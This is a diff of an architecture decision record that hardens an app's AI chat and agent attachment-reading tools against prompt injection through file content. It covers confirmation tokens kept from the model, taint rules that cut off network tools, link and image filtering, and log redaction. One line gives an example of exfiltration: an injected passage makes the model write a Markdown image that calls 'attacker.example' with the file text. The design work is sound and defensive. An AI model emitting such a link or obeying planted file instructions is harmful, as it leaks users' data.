@@ -73,10 +73,15 @@ round. It does not implement anything.
   map by name; without authentication enabled it runs only the tools in
   `SAFE_TOOLS`.
 - **Agents can reach the network.** Besides `GRAPH`, an Agent may have the
-  `WEB` (`fetch` of any public URL), `SEARCH` (a third-party search API),
-  `FS` and HTTP MCP integrations. All of their tools count as read-only for
-  the gate unless their name is in `MUTATING_ORIGINAL_TOOLS`, so they run
-  without a proposal.
+  `WEB` (`fetch` of any public URL), `SEARCH` (a third-party search API) and
+  `FS` integrations, which `MCPLoader.create_tool_executor` executes. Their
+  tools count as read-only for the gate unless their name is in
+  `MUTATING_ORIGINAL_TOOLS`, so they run without a proposal. Other
+  integration kinds have no executor today, but any added later falls under
+  the same rule.
+- **Agent runs write summaries.** The Agent worker logs each tool call's
+  input, per-turn reasoning text and the final response (truncated), and the
+  run history stores up to 500 characters of the run's final summary.
 - **Chat replies render Markdown with remote images.**
   `frontend/web/src/components/MarkdownMessage.jsx` renders assistant text
   with `react-markdown` and no URL filter, so an image reference in a reply
@@ -140,7 +145,8 @@ whose provider must not see stored files turn the switch off, or deny the
 - No external embedding API is called, ever, for attachment text.
 - There is **no persistent content index**: no embeddings of attachment text
   are stored, and extracted text lives only in a bounded in-memory cache
-  (§4) that does not survive a restart.
+  (§3) that does not survive a restart. (Text a model quotes into its own
+  output can still be kept where that output is kept — see Consequences.)
 - The search bar is unchanged: it indexes no attachment content
   (ADR 0008 Consequences, "Search").
 
@@ -175,7 +181,8 @@ Common rules:
 
 #### `list_node_attachments(node_id)` — read
 
-Metadata only, no content. The same payload as the REST list:
+Metadata only, no content. The REST list payload (ADR 0008 §7) plus
+`node_id`:
 
 ```json
 {
@@ -497,7 +504,9 @@ lxml's parser options, `lxml` gets its own minimum-pinned line in
 #### Limits and settings
 
 Every limit is a setting; a value of `0` or less is refused at boot, never
-read as "unlimited".
+read as "unlimited". The one exception is `ATTACHMENT_CHUNK_OVERLAP_CHARS`,
+which may be `0` and must be smaller than `ATTACHMENT_CHUNK_CHARS`, as
+`attachment_retrieval.chunk_segments` requires.
 
 | Setting | Default | Bounds |
 |---|---|---|
@@ -517,7 +526,7 @@ read as "unlimited".
 | `ATTACHMENT_SEARCH_MAX_TOP_K` | `20` | upper bound for `top_k` |
 | `ATTACHMENT_RERANK_CANDIDATES` | `32` | chunks sent to the optional embedding re-rank |
 | `ATTACHMENT_CHUNK_CHARS` | `1200` | chunk size |
-| `ATTACHMENT_CHUNK_OVERLAP_CHARS` | `200` | chunk overlap; must be smaller than the chunk size |
+| `ATTACHMENT_CHUNK_OVERLAP_CHARS` | `200` | chunk overlap; `0` or more and smaller than the chunk size |
 | `ATTACHMENT_RESULT_MAX_CHARS` | `24000` | passage text in one search response |
 | `ATTACHMENT_READ_MAX_CHARS` | `50000` | upper bound for `max_chars` in `read_node_attachment` |
 | `ATTACHMENT_TEXT_CACHE_MAX_CHARS` | `20000000` | in-memory LRU of extraction results, keyed by the file's SHA-256, per server process |
@@ -587,21 +596,38 @@ that read or only change what the user's own view shows:
 - `list_node_attachments`, `read_node_attachment`,
   `search_node_attachments`;
 - `propose_new_node` (formats a suggestion for the user; writes nothing),
-  `mark_nodes`, `clear_visualization`.
+  `present_form` (renders a form; writes nothing), `mark_nodes`,
+  `clear_visualization`.
 
 Every other tool — every write (`add_nodes`, `update_node`, `delete_nodes`,
 `delete_edges`, `archive_*`, `unarchive_*`, `save_view`,
 `save_collection_response`, `add_node_attachment`,
 `delete_node_attachment`) and any tool added later — is refused with error
-`confirmation_required` and a `pending_action`: the exact tool name and
-arguments plus a server-minted, single-use, short-lived token bound to them.
-The chat response returns the pending actions to the UI alongside the reply.
-The UI shows each one to the user, and it runs only when the user confirms it
-with a UI action, which posts the token to a confirmation route of the chat
-router. That route executes exactly the bound tool and arguments, once,
-inside `use_request_authorization` for the confirming request, under the
-same caller permissions (§2) as the turn that produced it. The model can
-neither confirm an action nor produce a confirmation by writing text.
+`confirmation_required`. The server records a pending action: the exact
+tool name and arguments, a server-minted, single-use, short-lived token, and
+the caller context of the turn — caller kind, the resolved collection (for a
+kiosk), the effective allowlist and the request actor.
+
+- **What the model sees.** Its tool result carries only
+  `confirmation_required` and a short message. The token and the bound
+  arguments never enter the model's context or the conversation history.
+- **What the user sees.** The chat response returns the pending actions to
+  the UI in their own `pending_actions` field, beside the reply. The card
+  shows the exact tool name and the complete arguments as the server
+  recorded them — never text the model wrote about them — and a fixed notice
+  that file content was in the conversation.
+- **How it runs.** Only a UI action of the user's runs it, by posting the
+  token to a confirmation route of the chat router. That route refuses when
+  the confirming request's actor differs from the recorded one. Otherwise it
+  re-resolves the recorded caller context and executes exactly the bound
+  tool and arguments, once, inside `use_request_authorization` for the
+  confirming request, through the same path the turn would have used: the
+  §2 permission layers, the allowlist gate and, for a kiosk, the
+  collection's enforced tool overrides (its node-type permissions and
+  `save_collection_response`).
+
+The model can neither confirm an action nor produce a confirmation by
+writing text.
 
 Being deny-by-default, a new chat tool is guarded until someone adds it to
 the permitted set. A regression test fails when the permitted set contains
@@ -613,7 +639,11 @@ history the client sends back, so the next user message is not clean. Each
 chat response therefore carries `untrusted_content_used: true` when its turn
 was tainted. The web client keeps that as a conversation-level flag and sends
 `conversation_tainted: true` with every later request of that conversation;
-the server treats such a request as tainted from its start. The flag lives in
+the server treats such a request as tainted from its start. The client
+attaches it in the one shared request function (`api.sendChatMessage`) from
+per-conversation state, not at each call site, so every send path — chat,
+approve, reject, confirm and kiosk — carries it; a test covers each path.
+The flag lives in
 the user's own client, which is adequate here: the adversary is the file
 content, not the user's browser, and a client that drops the flag removes
 protection only from its own user. A new conversation starts clean.
@@ -624,19 +654,34 @@ remote resources: the chat Markdown renderer
 own origin and `data:` URLs, and drops every other image. Without this, an
 injected passage could make the model write
 `![](https://attacker.example/?d=<file text>)` and the browser would send the
-text away as soon as the reply is shown, with no tool call involved. Links
-stay clickable; following one needs the user's click and shows its target.
-This change lands **before or with** the read tools.
+text away as soon as the reply is shown, with no tool call involved. A
+Markdown link can do the same with one click, because its text can hide its
+target. So a link to another origin is rendered with its full target URL as
+visible text and with `rel="noreferrer noopener"`. A test renders a reply
+with a remote image and an off-origin link and checks both rules. This
+change lands **before or with** the read tools.
 
 **Agents.** Every mutating `GRAPH` tool is already blocked or turned into a
 proposal (§2), so a human sees each write before it applies. That does not
-cover egress: `WEB__fetch`, the search integration and any HTTP MCP
-integration tool count as read-only and run unattended. So the same taint
-rule applies per Agent run: once any tool result in the run has
-`untrusted_content: true`, every tool outside the `GRAPH` integration is
-refused for the rest of that run, and every proposal the run creates is
-marked `tainted: true` so the approver sees that file content was in the
-run's context. This is enforced in `AutonomyGate.wrap`.
+cover egress: `WEB__fetch` and the search integration count as read-only and
+run unattended, and so would any integration kind added later. So a taint
+rule applies per Agent run, enforced in `AutonomyGate.wrap`: once any tool
+result in the run has `untrusted_content: true`,
+
+- every tool outside the `GRAPH` integration is refused for the rest of the
+  run;
+- a `GRAPH` tool runs only if its original name is in
+  `ATTACHMENT_TAINT_PERMITTED_TOOLS`; a mutating one is still turned into a
+  proposal, and any other is refused;
+- every proposal the run creates is marked `tainted: true`, so the approver
+  sees that file content was in the run's context.
+
+A regression test checks that every tool in
+`MCPLoader._get_graph_mcp_tools` is either in the permitted set or in
+`MUTATING_ORIGINAL_TOOLS`, so a new `GRAPH` tool cannot slip through
+unclassified. Another checks that an Agent with no grant never receives an
+attachment tool on the worker path, including a worker built without a
+proposal store, where the gate is not installed today.
 
 **External MCP clients** run their own loop, which this server cannot see.
 The envelope is all the server provides there; the client owns its guard.
@@ -663,12 +708,21 @@ A search call writes one record per file whose text contributed a returned
 passage. The record **never** contains extracted text, passage text, file
 bytes, the query or the file name.
 
-**No content in other logs.** The existing tool-call logging would otherwise
-defeat this: `ChatProcessor` logs every tool's full input at INFO, and the
-Agent tool executor logs a summary of the arguments. For the five attachment
-tools, both log only the tool name and argument sizes (`query` length,
-`content_text`/`content_base64` length), never the values, and no log line
-records an attachment tool's result. A regression test covers both sites.
+**No content in other logs.** The existing logging would otherwise defeat
+this. The sites that write tool arguments or model text are:
+
+- `ChatProcessor`'s tool-call line (`Executing tool: … with input: …`, full
+  input at INFO) in `backend/ui/chat_logic.py`;
+- `MCPLoader`'s tool-call line and its graph-tool error line, both through
+  `_summarize_args`, in `backend/agents/mcp_loader.py`;
+- the Agent worker's execution trace (tool inputs, per-turn reasoning, final
+  response) in `backend/agents/worker.py`.
+
+At each of them, the five attachment tools are always logged by name and
+argument sizes only (`query` length, `content_text`/`content_base64`
+length), and no line records an attachment tool's result. In a tainted turn
+or run (§5), every tool call is logged that way, and reasoning and response
+text are not logged. A regression test covers every site.
 
 ### 7. Amendment to ADR 0008 §7
 
@@ -713,8 +767,14 @@ binary bodies; the tools avoid it with bounded text or base64 arguments.
 - **Rollback, level 1:** `ATTACHMENT_CONTENT_ACCESS=off` and a restart remove
   every attachment tool for every caller, without a code change.
 - **Rollback, level 2:** deploy a build without the tools. Nothing is
-  persisted except audit log lines, pending Agent proposals and the
-  attachments themselves, which ADR 0008 owns.
+  persisted except audit log lines, pending Agent proposals, Agent run
+  history and the attachments themselves, which ADR 0008 owns.
+- **Model output can keep quoted text.** The model's own replies and
+  summaries may quote passages. Where those are kept — the conversation in
+  the user's client, Agent run history (its final summary, up to 500
+  characters), proposals — the quotation is kept too. The guarantee of D2 is
+  that the server keeps no index or copy of extracted text of its own, not
+  that no output ever quotes it.
 - **Proposals carry content.** An Agent's `add_node_attachment` proposal
   stores its arguments, so the proposal store holds up to
   `ATTACHMENT_MCP_MAX_DECODED_BYTES` of file content per such proposal until
